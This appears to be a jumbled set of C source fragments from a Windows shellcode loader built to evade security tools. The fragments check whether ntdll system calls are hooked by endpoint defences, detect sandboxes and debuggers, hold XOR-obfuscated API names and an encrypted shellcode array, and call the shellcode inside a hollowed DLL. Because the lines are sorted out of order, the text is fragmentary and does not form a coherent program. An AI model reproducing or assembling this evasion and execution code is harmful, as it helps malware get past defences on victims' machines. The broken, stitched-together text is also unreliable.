"{	PRINT_SUCCESS(""NtQueryInformationThread Not Hooked\n""); "
"{  PRINT_ERROR("" NtProtectVirtualMemory is Hooked\n"");  nbHooks++; "
"{  PRINT_ERROR(""I got you sandbox, it's can't be run here :(\n""); return -2; "
"{ '.','t','e','x','t',0 "
"{ 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 "
"{ 0x4e, 0x56, 0x0f, 0x3d, 0x54, 0x51, 0x1b, 0x30, 0x33, 0xb9, 0xca, 0x9b, 0xcb, 0x71, 0x31, 0x45, 0x59, 0x22, 0x33, 0x60, 0x70, 0xd4, 0x4d, 0x3b, 0xd3, 0x8c, 0xd8, 0x70, 0x4e, 0x71, 0x6d, 0x78, 0xa8, 0xb6, 0x09, 0x97, 0xcf, 0xf5, 0xf8, 0xa6, 0xeb, 0xfb, 0x32, 0x61, 0xcd, 0xfd, 0xbe, 0x88, 0xa2, 0xa7, 0xfd, 0x5d, 0xfc, 0x60, 0xea, 0x2d, 0x35, 0x41, 0x43, 0x31, 0xe5, 0xc8, 0x7b, 0x4d, 0x41, 0x73, 0x37, 0x6f, 0x48, 0x4e, 0x32, 0xcd, 0x10, 0x27, 0xcd, 0x88, 0xae, 0x07, 0x85, 0x27, 0xca, 0x0a, 0x6a, 0x31, 0x04, 0x6b, 0xad, 0xbe, 0x21, 0x76, 0x4f, 0xa4, 0xcd, 0x7b, 0x2d, 0x19, 0x23, 0x73, 0x2f, 0x10, 0x0a, 0x35, 0x6b, 0x19, 0x03, 0x68, 0x29, 0x95, 0x32, 0x05, 0xc9, 0x77, 0xbc, 0x2e, 0x98, 0x4f, 0x7a, 0x6b, 0x18, 0xf1, 0x76, 0x3f, 0x5d, 0xdb, 0x2d, 0x53, 0x91, 0x43, 0x79, 0x4c, 0x05, 0xb8, 0x09, 0x19, 0xab, 0x42, 0xbe, 0x71, 0x0b, 0x3b, 0x53, 0x14, 0x79, 0x7e, 0x86, 0x24, 0xb0, 0x54, 0xf4, 0x40, 0x03, 0x3d, 0xa1, 0x84, 0x72, 0xe1, 0x81, 0x42, 0x7f, 0xa6, 0x79, 0x03, 0xe5, 0x76, 0x10, 0xf2, 0x06, 0xfc, 0x10, 0x99, 0x93, 0x7d, 0x17, 0xa1, 0xe0, 0x69, 0x0c, 0x13, 0x0d, 0xca, 0x37, 0x2f, 0x27, 0xc3, 0x1e, 0xe3, 0x76, 0x10, 0x1d, 0x46, 0xb7, 0xd4, 0x18, 0x6c, 0x35, 0x41, 0xca, 0xb0, 0xe3, 0x95, 0x32, 0x05, 0x7d, 0x31, 0xbc, 0x4f, 0x1a, 0xc5, 0x7b, 0x26, 0x19, 0x28, 0xdf, 0x95, 0x90, 0x51, 0x2d, 0x38, 0x88, 0x83, 0x71, 0x48, 0x69, 0x31, 0x31, 0x20, 0x4f, 0x9b, 0xaf, 0x79, 0x06, 0xfa, 0x46, 0x15, 0x30, 0x78, 0xc0, 0x5e, 0x18, 0x3c, 0x47, 0xca, 0x0a, 0x10, 0x3a, 0xce, 0x7b, 0x55, 0x13, 0xf8, 0x7f, 0x0f, 0x1a, 0xc5, 0x7b, 0x12, 0x8a, 0x4b, 0x7a, 0x21, 0x00, 0x02, 0x3c, 0x74, 0x10, 0x03, 0x30, 0x68, 0x45, 0xf3, 0xa5, 0xb1, 0x97, 0xb4, 0x27, 0xb4 "
"{ 0xd7, 0xdb, 0xc5, 0xdf, 0x98, 0xd2, 0xda, 0xda, 0x0 "
"{ 0xd8, 0xc2, 0xd2, 0xda, 0xda, 0x98, 0xd2, 0xda, 0xda, 0x0 "
"{ 0xdd, 0xd3, 0xc4, 0xd8, 0xd3, 0xda, 0x85, 0x84, 0x98, 0xd2, 0xda, 0xda, 0x0 "
"{ 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0x0 "
"{ 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xf3, 0xce, 0xf8, 0xc3, 0xdb, 0xd7, 0x0 "
"{ 0xf1, 0xd3, 0xc2, 0xf5, 0xc3, 0xc4, 0xc4, 0xd3, 0xd8, 0xc2, 0xe6, 0xc4, 0xd9, 0xd5, 0xd3, 0xc5, 0xc5, 0x0 "
"{ 0xf1, 0xda, 0xd9, 0xd4, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0xe5, 0xc2, 0xd7, 0xc2, 0xc3, 0xc5, 0xf3, 0xce, 0x0 "
"{ 0xf3, 0xc2, 0xc1, 0xf3, 0xc0, 0xd3, 0xd8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0x0 "
"{ 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xf7, 0x0 "
"{ 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xf0, 0xdf, 0xda, 0xd3, 0xfb, 0xd7, 0xc6, 0xc6, 0xdf, 0xd8, 0xd1, 0xf7, 0x0 "
"{ 0xf5, 0xde, 0xd3, 0xd5, 0xdd, 0xe4, 0xd3, 0xdb, 0xd9, 0xc2, 0xd3, 0xf2, 0xd3, 0xd4, 0xc3, 0xd1, 0xd1, 0xd3, 0xc4, 0xe6, 0xc4, 0xd3, 0xc5, 0xd3, 0xd8, 0xc2, 0x0 "
"{ 0xf8, 0xc2, 0xe1, 0xc4, 0xdf, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 "
"{ 0xf8, 0xc2, 0xe6, 0xc4, 0xd9, 0xc2, 0xd3, 0xd5, 0xc2, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 "
"{ 0xf8, 0xc2, 0xe7, 0xc3, 0xd3, 0xc4, 0xcf, 0xff, 0xd8, 0xd0, 0xd9, 0xc4, 0xdb, 0xd7, 0xc2, 0xdf, 0xd9, 0xd8, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0x0 "
"{ 0xf8, 0xc2, 0xf5, 0xc4, 0xd3, 0xd7, 0xc2, 0xd3, 0xe2, 0xde, 0xc4, 0xd3, 0xd7, 0xd2, 0xf3, 0xce, 0x0 "
"{ 0xf8, 0xc2, 0xf7, 0xda, 0xda, 0xd9, 0xd5, 0xd7, 0xc2, 0xd3, 0xe0, 0xdf, 0xc4, 0xc2, 0xc3, 0xd7, 0xda, 0xfb, 0xd3, 0xdb, 0xd9, 0xc4, 0xcf, 0x0 "
"{ 0xfb, 0xd7, 0xc6, 0xe0, 0xdf, 0xd3, 0xc1, 0xf9, 0xd0, 0xf0, 0xdf, 0xda, 0xd3, 0x0 "
"{ 0xfe, 0xd9, 0x81, 0xc5, 0xf7, 0xfb, 0x85, 0xf3, 0xde, 0x86, 0xf4, 0xf7, 0x83, 0xda, 0xe6, 0xe7, 0xc1, 0x84, 0xcc, 0xee, 0xc1, 0x85, 0xf8, 0x0 "
"{ PRINT_ERROR("" NtAllocateVirtualMemory Hooked\n""); "
"{ PRINT_ERROR("" NtAllocateVirtualMemory is Hooked\n""); nbHooks++; "
"{ PRINT_ERROR("" NtCreateThreadEx is Hooked\n""); nbHooks++; "
"{ PRINT_ERROR("" NtProtectVirtualMemory Hooked\n"");"
"{ PRINT_ERROR("" NtQueryInformationThread Hooked\n""); "
"{ PRINT_ERROR(""NUMA memory allocate failed :( \n""); return -2; "
"{ PRINT_STATUS(""No hooked modules to unhook it!""); "
"{ PRINT_SUCCESS("" NtAllocateVirtualMemory Not Hooked""); "
"{ PRINT_SUCCESS("" NtAllocateVirtualMemory Not Hooked\n""); "
"{ PRINT_SUCCESS("" NtCreateThreadEx Not Hooked""); "
"{ PRINT_SUCCESS("" NtCreateThreadEx Not Hooked\n""); "
"{ PRINT_SUCCESS("" NtProtectVirtualMemory Not Hooked""); "
"{ PRINT_SUCCESS("" NtProtectVirtualMemory Not Hooked\n""); "
"{ PRINT_SUCCESS("" NtQueryInformationThread Not Hooked\n""); "
"{ PRINT_SUCCESST(""Debugger is not attach""); "
"{0xb4, 0x27, 0xb4, 0x97, 0xb1, 0xa5, 0xf3, 0x45, 0x68, 0x30, 0x3, 0x10, 0x74, 0x3c, 0x2, 0x0, 0x21, 0x7a, 0x4b, 0x8a, 0x12, 0x7b, 0xc5, 0x1a, 0xf, 0x7f, 0xf8, 0x13, 0x55, 0x7b, 0xce, 0x3a, 0x10, 0xa, 0xca, 0x47, 0x3c, 0x18, 0x5e, 0xc0, 0x78, 0x30, 0x15, 0x46, 0xfa, 0x6, 0x79, 0xaf, 0x9b, 0x4f, 0x20, 0x31, 0x31, 0x69, 0x48, 0x71, 0x83, 0x88, 0x38, 0x2d, 0x51, 0x90, 0x95, 0xdf, 0x28, 0x19, 0x26, 0x7b, 0xc5, 0x1a, 0x4f, 0xbc, 0x31, 0x7d, 0x5, 0x32, 0x95, 0xe3, 0xb0, 0xca, 0x41, 0x35, 0x6c, 0x18, 0xd4, 0xb7, 0x46, 0x1d, 0x10, 0x76, 0xe3, 0x1e, 0xc3, 0x27, 0x2f, 0x37, 0xca, 0xd, 0x13, 0xc, 0x69, 0xe0, 0xa1, 0x17, 0x7d, 0x93, 0x99, 0x10, 0xfc, 0x6, 0xf2, 0x10, 0x76, 0xe5, 0x3, 0x79, 0xa6, 0x7f, 0x42, 0x81, 0xe1, 0x72, 0x84, 0xa1, 0x3d, 0x3, 0x40, 0xf4, 0x54, 0xb0, 0x24, 0x86, 0x7e, 0x79, 0x14, 0x53, 0x3b, 0xb, 0x71, 0xbe, 0x42, 0xab, 0x19, 0x9, 0xb8, 0x5, 0x4c, 0x79, 0x43, 0x91, 0x53, 0x2d, 0xdb, 0x5d, 0x3f, 0x76, 0xf1, 0x18, 0x6b, 0x7a, 0x4f, 0x98, 0x2e, 0xbc, 0x77, 0xc9, 0x5, 0x32, 0x95, 0x29, 0x68, 0x3, 0x19, 0x6b, 0x35, 0xa, 0x10, 0x2f, 0x73, 0x23, 0x19, 0x2d, 0x7b, 0xcd, 0xa4, 0x4f, 0x76, 0x21, 0xbe, 0xad, 0x6b, 0x4, 0x31, 0x6a, 0xa, 0xca, 0x27, 0x85, 0x7, 0xae, 0x88, 0xcd, 0x27, 0x10, 0xcd, 0x32, 0x4e, 0x48, 0x6f, 0x37, 0x73, 0x41, 0x4d, 0x7b, 0xc8, 0xe5, 0x31, 0x43, 0x41, 0x35, 0x2d, 0xea, 0x60, 0xfc, 0x5d, 0xfd, 0xa7, 0xa2, 0x88, 0xbe, 0xfd, 0xcd, 0x61, 0x32, 0xfb, 0xeb, 0xa6, 0xf8, 0xf5, 0xcf, 0x97, 0x9, 0xb6, 0xa8, 0x78, 0x6d, 0x71, 0x4e, 0x70, 0xd8, 0x8c, 0xd3, 0x3b, 0x4d, 0xd4, 0x70, 0x60, 0x33, 0x22, 0x59, 0x45, 0x31, 0x71, 0xcb, 0x9b, 0xca, 0xb9, 0x33, 0x30, 0x1b, 0x51, 0x54, 0x3d, 0xf, 0x56, 0x4e"
"{PRINT_ERROR("" NtCreateThreadEx is Hooked\n""); nbHooks++;                "
"{PRINT_ERROR("" NtQueryInformationThread Hooked\n""); nbHooks++;   "
{ 0 
{ 0xC3 
{ pMem[nCtr++] = 0x00; 
{ return EXIT_FAILURE; 
{ return FALSE; 
{ return TRUE; 
{ shellcode[size/2] = shellcode[size/2]; 
{ void (*funcPtr)(void) = (void (*)()) pHollowedDLL; funcPtr(); 
